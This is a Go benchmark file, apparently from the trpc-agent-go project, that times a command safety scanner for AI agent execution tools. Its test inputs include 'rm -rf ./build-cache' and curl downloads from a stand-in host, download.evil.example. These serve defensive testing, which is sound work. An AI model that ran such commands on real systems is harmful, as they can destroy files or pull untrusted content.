//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"strings"
	"testing"
)

func BenchmarkScannerFiveHundredLineScript(
	b *testing.B,
) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"go",
	}

	scanner := NewScanner(policy)

	script := strings.Repeat(
		"go test ./tool/safety\n",
		500,
	)

	request := ScanRequest{
		ToolName: "execute_code",
		Command:  script,
		Backend:  BackendCodeExec,
	}

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		if _, err := scanner.Scan(
			context.Background(),
			request,
		); err != nil {
			b.Fatal(err)
		}
	}
}

func BenchmarkScannerMixedFiveHundredCommands(
	b *testing.B,
) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"go",
		"echo",
		"wc",
		"curl",
		"npm",
	}
	policy.NetworkAllowlist = []string{
		"github.com",
	}

	scanner := NewScanner(policy)

	commands := make([]ScanRequest, 500)

	for i := range commands {
		command := ""

		switch i % 5 {
		case 0:
			command = "go test ./tool/safety"
		case 1:
			command = "rm -rf ./build-cache"
		case 2:
			command = "curl " +
				"https://download.evil.example/data"
		case 3:
			command = "echo hello | wc -c"
		case 4:
			command = "npm install left-pad"
		}

		commands[i] = ScanRequest{
			ToolName: "workspace_exec",
			Command:  command,
			Backend:  BackendWorkspaceExec,
		}
	}

	b.ReportAllocs()
	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		for _, request := range commands {
			if _, err := scanner.Scan(
				context.Background(),
				request,
			); err != nil {
				b.Fatal(err)
			}
		}
	}
}

func BenchmarkScannerLongInputs(b *testing.B) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"curl",
		"echo",
	}
	policy.NetworkAllowlist = []string{
		"github.com",
	}

	scanner := NewScanner(policy)

	tests := []struct {
		name    string
		command string
	}{
		{
			name: "long_non_allowlisted_URL",
			command: "curl " +
				"https://download.evil.example/" +
				strings.Repeat("a", 16<<10),
		},
		{
			name: "long_argv",
			command: "echo " +
				strings.Repeat(
					"argument ",
					2048,
				),
		},
	}

	for _, tc := range tests {
		b.Run(tc.name, func(b *testing.B) {
			request := ScanRequest{
				ToolName: "workspace_exec",
				Command:  tc.command,
				Backend:  BackendWorkspaceExec,
			}

			b.SetBytes(int64(len(tc.command)))
			b.ReportAllocs()
			b.ResetTimer()

			for i := 0; i < b.N; i++ {
				if _, err := scanner.Scan(
					context.Background(),
					request,
				); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}
